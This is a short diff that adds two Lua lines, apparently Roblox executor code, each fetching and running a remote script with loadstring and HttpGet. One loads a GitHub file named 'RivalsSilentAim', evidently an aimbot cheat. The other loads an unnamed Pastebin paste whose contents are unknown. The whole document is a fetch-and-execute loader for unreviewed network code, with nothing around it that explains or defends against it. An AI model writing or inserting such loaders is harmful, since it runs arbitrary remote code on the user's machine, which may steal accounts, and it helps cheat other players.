@@ -1,0 +1,3 @@
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ThunderScriptSolutions/Misc/refs/heads/main/RivalsSilentAim'))();
+loadstring(game:HttpGet("https://pastebin.com/raw/CbJ9mMjC"))();
